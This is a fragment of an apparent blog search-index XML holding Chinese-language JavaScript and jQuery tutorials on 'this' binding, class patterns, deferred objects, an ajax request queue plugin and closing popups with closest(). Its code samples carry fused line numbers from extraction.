    <content type="text"><![CDATA[&nbsp;&emsp;&emsp;this应该算是javascript语言里面一个非常有意思的对象，因为他在不同环境下的指向都不一样，这很让很多刚开始学javascript的人容易产生混乱，我以前也是这样一片混乱，但是我建议要深入学习javascript语言的朋友，一定要完全理解this对象，因为他的应用非常广泛。今天就总结下这个令人头痛的this在不同情况下指向的问题，下面我的学习笔记总结，希望对一些刚开始学习javascript的人有些帮助。情况一：函数调用我们来看下下面一段简单函数代码：12345function fn()&#123; var x = 5; console.log(x); // 5&#125;fn();//执行函数，输出5&emsp;&emsp;上面的结果大家应该没有什么疑问，fn输出作用域内的声明的变量x值。但是我们在把上面的代码稍微改一下，变成这样：1234567function fn()&#123; this.x = 0; var x = 5; console.log(x); // 5&#125;fn(); //执行函数，输出5alert(x); //0&emsp;&emsp;上面这段是不是很有意思，我们在fn里面定义了一个this.x，在fn函数内输出了5，但是在fn函数作用域下我们输出x的时候发先居然是0，而不是5。这是因为我们声明的var x = 5；是一个局部变量，外界无法访问，那么输出的0肯定就是this.x=0;操作的结果，因为this.x相当于window.x,这个时候的fn内部的this.x相当于当于声明了一个全局变量x，代码等同于如下：1234567var x = 0;function fn()&#123; var x = 5; console.log(x); // 5&#125;fn(); //执行函数，输出5alert(x); //0&emsp;&emsp;上面这段是不是很有意思，我们在fn里面定义了一个this.x，在fn函数内输出了5，但是在fn函数作用域下我们输出x的时候发先居然是0，而不是5。这是因为我们声明的var x = 5；是一个局部变量，外界无法访问，那么输出的0肯定就是this.x=0;操作的结果，因为this.x相当于window.x,这个时候的fn内部的this.x相当于当于声明了一个全局变量x，代码等同于如下：1234567var x = 0;function fn()&#123; var x = 5; console.log(x); // 5&#125;fn(); //执行函数，输出5alert(x); //0情况二：在事件处理程序中我们再来看下面这一段常见的代码，我们定一个按钮来触发我们要操作的回调函数：12345var btn = document.getElementById("btn");btn.onclick = function()&#123; this.x = 5; console.log(x); // x is not defined &#125;再来看另一种事件处理程序写法：12345var btn = document.getElementById("btn");btn.addEventListener("click", function()&#123; this.x = 5; console.log(x); // x is not defined &#125;, false);&emsp;&emsp;程序还是报错，上面两段JS的事件绑定处理程序中的this都是指向的ID为btn的按钮，而不是window,很奇怪的设计，你如果要问我为什么我其实也不知道为什么javascript会这样设计this对象；不过大家只要记住上面这个特点以后的工作中就不会犯错了。情况三：作为对象方法的使用函数还可以作为某个对象的方法调用，这个时候this就指这个上级对象。12345678var arg = 0;function test()&#123; console.log(this.arg);&#125;var fn = &#123;&#125;;fn.arg = 5;fn.f = test;fn.f(); // 5其实上面这段代码还可以转换成下面这种写法：12345678var arg = 0;var fn = &#123; arg : 5, test : function()&#123; console.log(this.arg); // 5 &#125;&#125;fn.test(); // 5&emsp;&emsp;此时的this也是指向fn这个对象的，上面这个需要特别注意，不要搞混，在面向对象编程的时候非常需要理解这个this在这里的指向。情况四：作为构造函数时使用&emsp;&emsp;所谓的构造函数简单的理解就是new一个新对象，然后调用他，如下：12345function fn()&#123; this.x = 5;&#125;var test = new fn();console.log(test.x); // 5&emsp;&emsp;上面的代码应该大家都很常见，这个时候的this指向的这个new出来的新对象，我们来做个测试，看看this是不是真的指向的是new出来的新对象还是全局(window)：1234567var x = 0;function fn()&#123; this.x = 5;&#125;var test = new fn();console.log(test.x); // 5console.log(x); // 0&emsp;&emsp;大家看上面的结果，this如果指向全局（window）那我们的最后一行代码也将会输出5，而不是0。情况五：调用apply&emsp;&emsp;apply函数在js在也是扮演这很重的角色，他被很多人用来实现函数的继承，因为这个方法能劫持另外一个对象的方法，继承另外一个对象的属性.我们把情况三的代码改动成如下：12345678var arg = 0;var fn = &#123; arg : 5, test : function()&#123; console.log(this.arg); // 5 &#125;&#125;fn.test.apply(); // 0&emsp;&emsp;当调用apply()函数后，我们发现this他将不再指向这个对象本身了，而是指向了全局对象（window）。&emsp;&emsp;那如果我们要通过apply()函数让this指向对象本身怎么办呢？我们可以这样写：12345678var arg = 0;var fn = &#123; arg : 5, test : function()&#123; console.log(this.arg); // 5 &#125;&#125;fn.test.apply(fn); // 5只需在apply()函数指向fn就可以了。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js之this</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript定义类的3种方法]]></title>
    <url>%2F2015%2F07%2F18%2Fjavascript%E5%AE%9A%E4%B9%89%E7%B1%BB%E7%9A%843%E7%A7%8D%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[大家都知道javascript是一门弱语言，其语法非常灵活，你很可能经常会看见这样子的情况，一个JS功能，可以用N种写法去实现它，不同的人用不同的写法来进行实现。正因为javascript这种语言不够严谨，他和C,C++这些语言相比最大的缺点就是没有类的功能。但是我们其实是可以用javascript的函数来模拟类，来进行面向对象化的编程。今天我就来总结一下javascript定义类的3种方法，以下是我的学习笔记：1、使用函数定义定义一个正常的JavaScript函数,这个应该是最普遍的一种方法，通过创建函数，给函数定一个函数名，然后在函数内定义我们所需要的属性或方法来，如下：12345678function method (type) &#123; this.type = type; this.color = "red"; this.getInfo = getMethodInfo;&#125;function getMethodInfo() &#123; return this.color + ' ' + this.type + ' method ';&#125;然后我们现在需要实例化上面的函数，调用里面的方法和属性时，我们可以这样做：123var newMethod = new method('animal');newMethod.color = "blue";alert(newMethod.getInfo());//blue animal Method1.1在函数内部定义方法：在上面的这种方法里面我们把我们的类方法单独写了一个函数来调用，这种方法的一个最大的缺点是增加了全局函数，容易发生全局函数污染，在大的项目里面，很容导致函数命名冲突，为了减少全局函数的污染，我们可以将函数方法，写在类里面，例如：1234567function method (type) &#123; this.type = type; this.color = "red"; this.getInfo = function()&#123; return this.color + ' ' + this.type + ' Method '; &#125;;&#125;调用方法和上面是一样的：123var newMethod = new method('animal');newMethod.color = "blue";alert(newMethod.getInfo());blue animal Method1.2往函数添加原型方法，俗称工厂模式1.1方法的缺点就是我们每次添加新的方法都需要到我们定义类里面去添加，这样子还是比较麻烦，也容易导致出错的，有没有什么办法能在不干预我们之前定义好的类的前提下，另外往这个类里面添加新的方法呢？这个时候我们就可以使用比较著名的工厂原型方法来实现，以上代码改写后：12345678910function method (type) &#123; this.type = type; this.color = "red";&#125;method.prototype.getInfo = function() &#123; return this.color + ' ' + this.type + ' Method';&#125;;method.prototype.getInfo2 = function() &#123; return this.color + ' ' + this.type + ' Method2';&#125;;然后调用方法同上：1234var newMethod = new method('animal');newMethod.color = "blue";alert(newMethod.getInfo());//blue animal Method alert(newMethod.getInfo2());//blue animal Method22.对象字面量方法对象字面量的方法非常的强大，在javascript中应用非常个广泛，其结构清晰，简单，下面我只做一个简单的介绍，有兴趣的同学建议可以看一看这篇文章《Using Objects to Organize Your Code》 。我们平常定义一个数组的时候我们可能会用简写来代替，例如用：arr = []```12代替```var arr = new Array();当然我们创建对象的时候也可以用简写，例如：fn = &#123;&#125;```12来代替：```var fn = new Object();根据上面这个例子，我们也可以将我们上面的那个方法改写成对象字面量：1234567var method = &#123; type: "animal", color: "red", getInfo: function () &#123; return this.color + ' ' + this.type + ' Method'; &#125;&#125;通过上面这种方法有点是我们调用的时候就不需要再使用new来实例化，我们可以通过如下的方法来调用：12method.color = "blue";alert(method.getInfo());//blue animal Method上面这种方法我们有时候也称它为单例，因为他是不能在被实例化多个对象，我们只能单一的使用它。根据上的代码，我们如果用第一种方法来实现，是肯定会报错的：newMethod = new Method();link12345678910111213141516但是对象字面量法并不算是完全单例模式，我们其实可以通过深拷贝来继承他，相当将他的所有属性和方法拷贝给另一个对象来实现类似实例化的对象的方法。既然都说到这块了，我就简单说下深拷贝的实现方法吧：**深拷贝继承代码：**```javascriptfunction deepCopy(p, c) &#123; var c = c || &#123;&#125;; for (var i in p) &#123; if (typeof p[i] === &apos;object&apos;) &#123; c[i] = (p[i].constructor === Array) ? [] : &#123;&#125;; deepCopy(p[i], c[i]); &#125; else &#123; c[i] = p[i]; &#125; &#125; return c;&#125;然后我们通过上面这个方法，再将定一个对象来继承我们刚刚写的method方法：123var method2 = deepCopy(method);method2.color = "blue";console.log(method2.getInfo());//blue animal Method通过这种深拷贝，我们相当于是等于实例化了一个新的对象拥有了method的所有属性和方法，据说目前，jQuery库使用的就是这种继承方法，这个方法是我从别人那里看到的，并不是我发现的哈。3.使用单例函数方法第三种方法其实是结合了上面的两个方法。您可以使用一个函数1234567var method = new function() &#123; this.type = "animal"; this.color = "red"; this.getInfo = function () &#123; return this.color + ' ' + this.type + ' Method'; &#125;;&#125;上面的方法看起来似乎很像1.1的语法，但是我们调用上面的类的时候又是和对象字面量的方法一样：12method.color = "blue";alert(method.getInfo());//blue animal Methodnew function(){…}其实包含了两个功能：定义了一个函数（匿名函数）并实例化他后立即调用上面这种方法比较少见，用法就看你自己怎么去选择了，如果你定义了一个类，但是只想使用一次，但你只会使用一次这个类，你可以通过上面的方法先给这个类一个名字，然后通过上的方法就可以只实例化一次了。好了上面总结了一下算是我的学习笔记，希望能对大家学习javascript的面向对象化的学习有所帮助，语言描述如有不足或者有疑问，请随时留言给我，谢谢。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js自定义类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery的deferred对象详解]]></title>
    <url>%2F2015%2F07%2F18%2Fjquery%E7%9A%84deferred%E5%AF%B9%E8%B1%A1%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[jQuery的开发速度很快，几乎每半年一个大版本，每两个月一个小版本。每个版本都会引入一些新功能。今天我想介绍的，就是从jQuery 1.5.0版本开始引入的一个新功能—-deferred对象。这个功能很重要，未来将成为jQuery的核心方法，它彻底改变了如何在jQuery中使用ajax。为了实现它，jQuery的全部ajax代码都被改写了。但是，它比较抽象，初学者很难掌握，网上的教程也不多。所以，我把自己的学习笔记整理出来了，希望对大家有用。本文不是初级教程，针对的读者是那些已经具备jQuery使用经验的开发者。如果你想了解jQuery的基本用法，请阅读我编写的《jQuery设计思想》和《jQuery最佳实践》。一、什么是deferred对象？开发网站的过程中，我们经常遇到某些耗时很长的javascript操作。其中，既有异步的操作（比如ajax读取服务器数据），也有同步的操作（比如遍历一个大型数组），它们都不是立即能得到结果的。通常的做法是，为它们指定回调函数（callback）。即事先规定，一旦它们运行结束，应该调用哪些函数。但是，在回调函数方面，jQuery的功能非常弱。为了改变这一点，jQuery开发团队就设计了deferred对象。简单说，deferred对象就是jQuery的回调函数解决方案。在英语中，defer的意思是”延迟”，所以deferred对象的含义就是”延迟”到未来某个点再执行。它解决了如何处理耗时操作的问题，对那些操作提供了更好的控制，以及统一的编程接口。它的主要功能，可以归结为四点。下面我们通过示例代码，一步步来学习。二、ajax操作的链式写法首先，回顾一下jQuery的ajax操作的传统写法：123456789$.ajax(&#123; url: "test.html", success: function()&#123; alert("哈哈，成功了！"); &#125;, error:function()&#123; alert("出错啦！"); &#125; &#125;);在上面的代码中，$.ajax()接受一个对象参数，这个对象包含两个方法：success方法指定操作成功后的回调函数，error方法指定操作失败后的回调函数。$.ajax()操作完成后，如果使用的是低于1.5.0版本的jQuery，返回的是XHR对象，你没法进行链式操作；如果高于1.5.0版本，返回的是deferred对象，可以进行链式操作。现在，新的写法是这样的：123$.ajax("test.html") .done(function()&#123; alert("哈哈，成功了！"); &#125;) .fail(function()&#123; alert("出错啦！"); &#125;);可以看到，done()相当于success方法，fail()相当于error方法。采用链式写法以后，代码的可读性大大提高。三、指定同一操作的多个回调函数deferred对象的一大好处，就是它允许你自由添加多个回调函数。还是以上面的代码为例，如果ajax操作成功后，除了原来的回调函数，我还想再运行一个回调函数，怎么办？很简单，直接把它加在后面就行了。1234.ajax("test.html") .done(function()&#123; alert("哈哈，成功了！");&#125; ) .fail(function()&#123; alert("出错啦！"); &#125; ) .done(function()&#123; alert("第二个回调函数！");&#125; );回调函数可以添加任意多个，它们按照添加顺序执行。四、为多个操作指定回调函数deferred对象的另一大好处，就是它允许你为多个事件指定一个回调函数，这是传统写法做不到的。请看下面的代码，它用到了一个新的方法$.when():123$.when($.ajax("test1.html"), $.ajax("test2.html")) .done(function()&#123; alert("哈哈，成功了！"); &#125;) .fail(function()&#123; alert("出错啦！"); &#125;);这段代码的意思是，先执行两个操作$.ajax(“test1.html”)和$.ajax(“test2.html”)，如果都成功了，就运行done()指定的回调函数；如果有一个失败或都失败了，就执行fail()指定的回调函数。五、普通操作的回调函数接口（上）deferred对象的最大优点，就是它把这一套回调函数接口，从ajax操作扩展到了所有操作。也就是说，任何一个操作—-不管是ajax操作还是本地操作，也不管是异步操作还是同步操作—-都可以使用deferred对象的各种方法，指定回调函数。我们来看一个具体的例子。假定有一个很耗时的操作wait：123456var wait = function()&#123; var tasks = function()&#123; alert("执行完毕！"); &#125;; setTimeout(tasks,5000); &#125;;我们为它指定回调函数，应该怎么做呢？很自然的，你会想到，可以使用$.when()：123$.when(wait()) .done(function()&#123; alert("哈哈，成功了！"); &#125;) .fail(function()&#123; alert("出错啦！"); &#125;);但是，这样写的话，done()方法会立即执行，起不到回调函数的作用。原因在于$.when()的参数只能是deferred对象，所以必须对wait()进行改写：123456789var dtd = $.Deferred(); // 新建一个deferred对象 var wait = function(dtd)&#123; var tasks = function()&#123; alert("执行完毕！"); dtd.resolve(); // 改变deferred对象的执行状态 &#125;; setTimeout(tasks,5000); return dtd; &#125;;现在，wait()函数返回的是deferred对象，这就可以加上链式操作了。123$.when(wait(dtd)) .done(function()&#123; alert("哈哈，成功了！"); &#125;) .fail(function()&#123; alert("出错啦！"); &#125;);wait()函数运行完，就会自动运行done()方法指定的回调函数。六、deferred.resolve()方法和deferred.reject()方法如果仔细看，你会发现在上面的wait()函数中，还有一个地方我没讲解。那就是dtd.resolve()的作用是什么？要说清楚这个问题，就要引入一个新概念”执行状态”。jQuery规定，deferred对象有三种执行状态—-未完成，已完成和已失败。如果执行状态是”已完成”（resolved）,deferred对象立刻调用done()方法指定的回调函数；如果执行状态是”已失败”，调用fail()方法指定的回调函数；如果执行状态是”未完成”，则继续等待，或者调用progress()方法指定的回调函数（jQuery1.7版本添加）。前面部分的ajax操作时，deferred对象会根据返回结果，自动改变自身的执行状态；但是，在wait()函数中，这个执行状态必须由程序员手动指定。dtd.resolve()的意思是，将dtd对象的执行状态从”未完成”改为”已完成”，从而触发done()方法。类似的，还存在一个deferred.reject()方法，作用是将dtd对象的执行状态从”未完成”改为”已失败”，从而触发fail()方法。123456789101112var dtd = $.Deferred(); // 新建一个Deferred对象 var wait = function(dtd)&#123; var tasks = function()&#123; alert("执行完毕！"); dtd.reject(); // 改变Deferred对象的执行状态 &#125;; setTimeout(tasks,5000); return dtd; &#125;; $.when(wait(dtd)) .done(function()&#123; alert("哈哈，成功了！"); &#125;) .fail(function()&#123; alert("出错啦！"); &#125;);七、deferred.promise()方法上面这种写法，还是有问题。那就是dtd是一个全局对象，所以它的执行状态可以从外部改变。请看下面的代码：12345678910111213ar dtd = $.Deferred(); // 新建一个Deferred对象 var wait = function(dtd)&#123; var tasks = function()&#123; alert("执行完毕！"); dtd.resolve(); // 改变Deferred对象的执行状态 &#125;; setTimeout(tasks,5000); return dtd; &#125;; $.when(wait(dtd)) .done(function()&#123; alert("哈哈，成功了！"); &#125;) .fail(function()&#123; alert("出错啦！"); &#125;); dtd.resolve();我在代码的尾部加了一行dtd.resolve()，这就改变了dtd对象的执行状态，因此导致done()方法立刻执行，跳出”哈哈，成功了！”的提示框，等5秒之后再跳出”执行完毕！”的提示框。为了避免这种情况，jQuery提供了deferred.promise()方法。它的作用是，在原来的deferred对象上返回另一个deferred对象，后者只开放与改变执行状态无关的方法（比如done()方法和fail()方法），屏蔽与改变执行状态有关的方法（比如resolve()方法和reject()方法），从而使得执行状态不能被改变。请看下面的代码：123456789101112131415var dtd = $.Deferred(); // 新建一个Deferred对象 var wait = function(dtd)&#123; var tasks = function()&#123; alert("执行完毕！"); dtd.resolve(); // 改变Deferred对象的执行状态 &#125;; setTimeout(tasks,5000); return dtd.promise(); // 返回promise对象 &#125;; var d = wait(dtd); // 新建一个d对象，改为对这个对象进行操作 $.when(d) .done(function()&#123; alert("哈哈，成功了！"); &#125;) .fail(function()&#123; alert("出错啦！"); &#125;); d.resolve(); // 此时，这个语句是无效的在上面的这段代码中，wait()函数返回的是promise对象。然后，我们把回调函数绑定在这个对象上面，而不是原来的deferred对象上面。这样的好处是，无法改变这个对象的执行状态，要想改变执行状态，只能操作原来的 #ff6600;”&gt;deferred对象。不过，更好的写法是allenm所指出的，将dtd对象变成wait(）函数的内部对象。12345678910111213var wait = function(dtd)&#123; var dtd = $.Deferred(); //在函数内部，新建一个Deferred对象 var tasks = function()&#123; alert("执行完毕！"); dtd.resolve(); // 改变Deferred对象的执行状态 &#125;; setTimeout(tasks,5000); return dtd.promise(); // 返回promise对象 &#125;; $.when(wait()) .done(function()&#123; alert("哈哈，成功了！"); &#125;) .fail(function()&#123; alert("出错啦！"); &#125;);八、普通操作的回调函数接口（中）另一种防止执行状态被外部改变的方法，是使用deferred对象的建构函数$.Deferred()。这时，wait函数还是保持不变，我们直接把它传入$.Deferred()：123$.Deferred(wait) .done(function()&#123; alert("哈哈，成功了！"); &#125;) .fail(function()&#123; alert("出错啦！"); &#125;);jQuery规定，$.Deferred()可以接受一个函数名（注意，是函数名）作为参数，$.Deferred()所生成的deferred对象将作为这个函数的默认参数。九、普通操作的回调函数接口（下）除了上面两种方法以外，我们还可以直接在wait对象上部署deferred接口。123456789101112var dtd = $.Deferred(); // 生成Deferred对象 var wait = function(dtd)&#123; var tasks = function()&#123; alert("执行完毕！"); dtd.resolve(); // 改变Deferred对象的执行状态 &#125;; setTimeout(tasks,5000); &#125;; dtd.promise(wait); wait.done(function()&#123; alert("哈哈，成功了！"); &#125;) .fail(function()&#123; alert("出错啦！"); &#125;); wait(dtd);这里的关键是dtd.promise(wait)这一行，它的作用就是在wait对象上部署Deferred接口。正是因为有了这一行，后面才能直接在wait上面调用done()和fail()。十、小结：deferred对象的方法前面已经讲到了deferred对象的多种方法，下面做一个总结：（1） $.Deferred() 生成一个deferred对象。（2） deferred.done() 指定操作成功时的回调函数（3） deferred.fail() 指定操作失败时的回调函数（4） deferred.promise() 没有参数时，返回一个新的deferred对象，该对象的运行状态无法被改变；接受参数时，作用为在参数对象上部署deferred接口。（5） deferred.resolve() 手动改变deferred对象的运行状态为”已完成”，从而立即触发done()方法。（6）deferred.reject() 这个方法与deferred.resolve()正好相反，调用后将deferred对象的运行状态变为”已失败”，从而立即触发fail()方法。（7） $.when() 为多个操作指定回调函数。除了这些方法以外，deferred对象还有二个重要方法，上面的教程中没有涉及到。（8）deferred.then()有时为了省事，可以把done()和fail()合在一起写，这就是then()方法。12$.when($.ajax( "/main.php" )) .then(successFunc, failureFunc );如果then()有两个参数，那么第一个参数是done()方法的回调函数，第二个参数是fail()方法的回调方法。如果then()只有一个参数，那么等同于done()。（9）deferred.always()这个方法也是用来指定回调函数的，它的作用是，不管调用的是deferred.resolve()还是deferred.reject()，最后总是执行。12$.ajax( "test.html" ) .always( function() &#123; alert("已执行！");&#125; );]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>deferred</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何让你的ajax更加高效且完善]]></title>
    <url>%2F2015%2F07%2F18%2F%E5%A6%82%E4%BD%95%E8%AE%A9%E4%BD%A0%E7%9A%84ajax%E6%9B%B4%E5%8A%A0%E9%AB%98%E6%95%88%E4%B8%94%E5%AE%8C%E5%96%84%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;随着web应用的高速发展，为了能让用户体验能更上一层楼，页面中的ajax的应用越来越多了，但是很多时候我们会遇到多个ajax同时发生请求，上一个ajax还没请求完成下一个就开始来了。还有一种情况是用户对一个ajax地址连续发出多次重复请求。但是这些情况大部分是我们无法控制的，因为我们无法控制用户的操作行为，但是可以控制他们发出的ajax请求，让ajax如何高效且稳定运行就是我们所需要做的了。&emsp;&emsp;目前大部分网站都在使用jquery，今天我总结一下如何用jquery来执行高效的执行ajax请求，以下是我学习笔记：一、更新你的ajax写法我们来看下传统的的ajax写法：1234567891011$.ajax(&#123; url: "/ajax", type:"get", dataType: "json" success: function()&#123; alert("哈哈，成功了！"); &#125;, error:function()&#123; alert("出错啦！"); &#125;&#125;);&emsp;&emsp;上面这个标准的ajax写法覆盖率非常高，在我工作中接触的所有ajax几乎都是上面这个写法，我相信大部分人都应该是这样写的。由于现在大部分前端开发人员一般是不涉及有关ajax操作和后台数据关联的工作，这部分工作大部分都是后台开发人员去执行的，所以这就是为什么现在我们依然经常看到jquery1.4+版本的jquery使用率依旧如此高的原因，因为许多开发人员都还停留在jquery1.4+版本甚至更低的版本的写法。jquery1.5+以后的版本的新功能大部分人都没用到，也没去更新自己的知识。&emsp;&emsp;从jquery1.5+版本以后的，他们引入了一个新的功能deferred对象。jquery为此对ajax进行了重构。关于deferred大家可以看我转载的阮一峰老师的那篇文章，写的非常详细，我这里就不多做介绍了他的功能了。直接上jquery1.5+以后的ajax写法：123456789jQuery.ajaxQueue(&#123; url: "/ajax", type:"get", dataType: "json"&#125;).done(function( data ) &#123; console.log("成功回调");&#125;).fail(function(data)&#123; console.log("失败回调");&#125;);采用链式写法以后，代码的可读性大大提高。上面的代码我们还可以通过deferred的then()函数来简化一下：12345jQuery.ajaxQueue(&#123; url: "/ajax", type: "get", dataType: "json"&#125;).then(doneFn, failFn);then()有两个参数:第一个参数是done()方法的回调函数，第二个参数是fail()方法的回调方法。如果then()只有一个参数，那么等同于done()。二、ajax队列机制&emsp;&emsp;jquery的queue()函数大家应该不陌生，我们ajax的队列机制就需要用到这个函数方法来实现。平时大家在工作的时候应该会遇到页面较多的ajax操作，很多时候用户在操作的时候，上一个操作还没请求完成就又开始操作下一个ajax请求。或者是重复请求同一个ajax，例如在一个注册页面中，需要ajax用户邮箱是否有重复，这个时候一般都是失去input焦点触发ajax请求，但是有些用户会重复操作，或者操作过快，导致ajax还没请求完就又马上开始请求。这个时候我们就需要用到queue()函数来将ajax队列化，让上一个请求完成后在进行下一个请求。我们先来复习一下==queue()==的用法吧，来看一下jquery给的一个官网例子吧：1234567891011121314151617181920$( "#show" ).click(function() &#123; var n = jQuery.queue( $( "div" )[ 0 ], "fx" ); $( "span" ).text( "Queue length is: " + n.length );&#125;);function runIt() &#123; $( "div" ) .show( "slow" ) .animate(&#123; left: "+=200" &#125;, 2000 ) .slideToggle( 1000 ) .slideToggle( "fast" ) .animate(&#123; left: "-=200" &#125;, 1500 ) .hide( "slow" ) .show( 1200 ) .slideUp( "normal", runIt );&#125;runIt();queue(element,[queueName])接受两个参数，第一个是列队的DOM元素，第二个是队列的名称，默认是fx。&emsp;&emsp;看到上面官网的例子大家应该对queue()的用法了有些了解了，但是我们今天的重点不是讲这个，我们要怎么用他来实现ajax队列化呢，我曾经在网上找了许多关于ajax队列的学习方法，但是最终都感觉不太理想，各种各样的写法都有，直到后面看到了Corey Frang写ajaxQueue真的非常给力，先来看下他写的这个插件和调用用法：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/** jQuery.ajaxQueue - A queue for ajax requests* * (c) 2011 Corey Frang* Dual licensed under the MIT and GPL licenses.** Requires jQuery 1.5+*/ (function($) &#123;// jQuery on an empty object, we are going to use this as our Queuevar ajaxQueue = $(&#123;&#125;);$.ajaxQueue = function( ajaxOpts ) &#123; var jqXHR, dfd = $.Deferred(), promise = dfd.promise(); // 将ajax加入运行队列 ajaxQueue.queue( doRequest ); // add the abort method promise.abort = function( statusText ) &#123; // proxy abort to the jqXHR if it is active if ( jqXHR ) &#123; return jqXHR.abort( statusText ); &#125; // if there wasn't already a jqXHR we need to remove from queue var queue = ajaxQueue.queue(), index = $.inArray( doRequest, queue ); if ( index &gt; -1 ) &#123; queue.splice( index, 1 ); &#125; // and then reject the deferred dfd.rejectWith( ajaxOpts.context || ajaxOpts, [ promise, statusText, "" ] ); return promise; &#125;; // run the actual query function doRequest( next ) &#123; jqXHR = $.ajax( ajaxOpts ) .done( dfd.resolve ) .fail( dfd.reject ) .then( next, next ); &#125; return promise;&#125;;&#125;)(jQuery);下面是调用方法：12345678$.ajaxQueue(&#123; url: "/echo/html/", dataType: "json"&#125;).done(function( data ) &#123; console.log("请求成功回调函数"); &#125;).fail(function()&#123; alert("请求失败回调函数"); &#125;);&emsp;&emsp;如果没有兴趣了解实现原理的同学直接把他的插件下载到自己工作包中直接调用就可以，调用方法也很简单。&emsp;&emsp;下面我我贴上我根据自己的理解写了一些注释，希望能帮助大家理解：12345678910111213141516171819202122232425262728293031323334353637(function($) &#123; // 声明一个jquery空对象，这个对象用来存放我们的队列var ajaxQueue = $(&#123;&#125;);$.ajaxQueue = function( ajaxOpts ) &#123; var jqXHR, dfd = $.Deferred(), promise = dfd.promise(); // 执行我们的ajax查询操作 ajaxQueue.queue( doRequest ); // 添加中断ajax方法 promise.abort = function( statusText ) &#123; // 判断ajax是否在运行,如果有正在运行ajax，就将其结束掉ajax if ( jqXHR ) &#123; return jqXHR.abort( statusText ); &#125; // 将执行完毕的ajax从队列中删除 var queue = ajaxQueue.queue(), index = $.inArray( doRequest, queue ); // 判断队列中是否存在执行完毕ajax，如有就将其从队列中剔除 if ( index &gt; -1 ) &#123; queue.splice( index, 1 ); &#125; // 最后将ajax状态改为失败，rejectWith()作用相当于reject() dfd.rejectWith( ajaxOpts.context || ajaxOpts, [ promise, statusText, "" ] ); return promise; &#125;; // 执行我们的ajax查询操作方法 function doRequest( next ) &#123; jqXHR = $.ajax( ajaxOpts ) .done( dfd.resolve ) .fail( dfd.reject ) .then( next, next ); &#125; return promise;&#125;;&#125;)(jQuery);&emsp;&emsp;上面代码的注释是我自己根据对代码的理解写的，并不是根据他的注释翻译过来的，或许也有不准确的地方，如有问题希望能帮指出。上面有几个要点需要再解释一下：abort()：用来终止之前所有的未结束的ajax请求，然后重新开始新的请求，但是这个方法在终止请求的时候，实际上会触发ajax的success回调函数方法，所以需要在success方法中添加判断response对象是否存在，上面代码中作者就进行了判断。(if(index&gt;-1))；rejectWith():这个方法和reject()作用一样，将Deferred对象的状态由“未完成”改为“已失败”状态，并触发deferred的fail回调函数。如果deferred的状态已经是“已完成”，那么该函数将失效。但是reject函数可以接收一个参数，用于传给deferred的failCallback。而deferred.rejectWith()额外接受一个参数context，作为在fail回调函数中this的值。我们来做一个简单的例子测试一下：12345678(function()&#123; var dfd = $.Deferred(); dfd.fail(function(context)&#123; alert(this.name); alert(context); &#125;); dfd.rejectWith(&#123;name:'520UED'&#125;, ["小欧又在做测试"]);&#125;)]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>ajax高效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery点击自身以外地方关闭弹出层]]></title>
    <url>%2F2015%2F07%2F18%2Fjquery%E7%82%B9%E5%87%BB%E8%87%AA%E8%BA%AB%E4%BB%A5%E5%A4%96%E5%9C%B0%E6%96%B9%E5%85%B3%E9%97%AD%E5%BC%B9%E5%87%BA%E5%B1%82%2F</url>
    <content type="text"><![CDATA[&nbsp;今天工作中遇到一个交互效果，是关于点击自身以外地方关闭弹出层，效果如百度，谷歌搜索时出现的提示框，点击输入框外部任意地方后，隐藏提示框。但是通过jquery怎么实现这个交互效果呢，我自己想了个方法，然后又到google看了下其他人方法，但是发现有许多人的方法都无法实现这种交互效果。现在就把我的方法介绍下：其实代码很简单，只要几行jquery就可以实现，请看代码：123456789$(function()&#123; $(document).bind("click", function (e) &#123; if($(e.target).closest("#txt").length&gt;0)&#123; $("#tip").show(); &#125;else&#123; $("#tip").hide(); &#125; &#125;); &#125;);其实这几行juqery代码中只有一个方法是重点，只要大家弄懂就这个函数就能明白。closest()jQuery API对这个函数的解释是：closest会首先检查当前元素是否匹配，如果匹配则直接返回元素本身。如果不匹配则向上查找父元素，一层一层往上，直到找到匹配选择器的元素。如果什么都没找到则返回一个空的jQuery对象。closest和parents的主要区别是：1，前者从当前元素开始匹配寻找，后者从父元素开始匹配寻找；2，前者逐级向上查找，直到发现匹配的元素后就停止了，后者一直向上查找直到根元素，然后把这些元素放进一个临时集合中，再用给定的选择器表达式去过滤；3，前者返回0或1个元素，后者可能包含0个，1个，或者多个元素。closest对于处理事件委托非常有用。我们再来看下他的一些用法例子：1234&lt;ul&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;jQuery 代码"body"]);```1234##### 结果:```[ul, body]这个函数的用法还有很多用处，不仅限于这种交互效果，只要弄懂，在工作中应该可以提高代码质量还有效率]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>点击关闭</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解JS原型链与继承]]></title>
    <url>%2F2015%2F07%2F17%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3js%E5%8E%9F%E5%9E%8B%E9%93%BE%E4%B8%8E%E7%BB%A7%E6%89%BF%2F</url>
